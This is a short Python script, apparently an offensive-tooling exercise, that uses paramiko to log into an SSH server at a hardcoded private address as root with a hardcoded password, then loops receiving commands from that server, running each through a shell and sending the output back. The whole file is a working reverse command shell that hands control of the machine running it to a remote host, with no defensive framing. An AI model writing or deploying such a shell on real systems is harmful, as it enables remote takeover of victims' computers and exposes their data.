import paramiko
from threading import Thread
from subprocess import check_output

def ssh_command(ip, user, password, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=password)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            try:
                command = ssh_session.recv(1024) #get the command from ssh server
                try:
                    cmd_output = check_output(command, shell=True)
                    ssh_session.send(cmd_output)
                except Exception as e:
                    ssh_session.send(str(e))
            except KeyboardInterrupt:
                break
ssh_command("192.168.43.60", "root", "567890", "ClientConnected")
        
                    